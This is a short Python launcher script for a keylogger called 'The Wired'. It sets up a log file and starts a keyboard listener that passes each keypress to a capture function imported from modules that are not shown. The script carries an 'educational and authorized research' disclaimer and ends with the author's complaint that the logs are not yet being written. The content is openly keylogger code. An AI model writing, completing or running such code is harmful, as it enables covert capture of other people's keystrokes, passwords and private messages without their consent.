from logging_wires import log_wired
from The_Wired_v1 import The_wired,keyboard

""" 
IMPORTANT: Educational and Authorized Research Purposes Only. 
"""

if __name__ == "__main__":
    # Setup the logging file
    log_wired("wired_logs.log")
    
    #run The Wired (keylogger)
    print("[*] The Wired is running. Logs are being separated...")
    with keyboard.Listener(on_press=The_wired) as listener:
        listener.join() 
        
#im almost done but the logs arent logging ima crashout man